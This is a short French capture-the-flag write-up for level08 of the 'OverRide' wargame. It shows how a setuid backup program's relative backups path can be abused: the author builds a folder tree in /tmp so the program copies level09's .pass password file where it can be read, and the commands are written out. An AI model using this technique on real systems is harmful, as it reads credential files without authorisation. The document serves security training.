# Level08

On a un fichier qui crée un backup que l'on peut lire du fichier qu'on lui passe en argument.

L'objectif va etre de lui passer en argument le chemin du .pass de level09 mais nous rencontrons un soucis:

```c
$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
Pour regler ca il faudrait creer les dossiers /home/users/level09/ dans le dossier backup mais nous n'avons pas les permissions...

Manque de bol, le dossier backup est tout le temps accede via un chemin relatif qui depend du repertoire dans lequel on execute le programme.

Il suffit de se deplacer dans /tmp/ pour creer notre propre structure de dossier. 

level08@OverRide:/tmp$ cd /tmp/
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 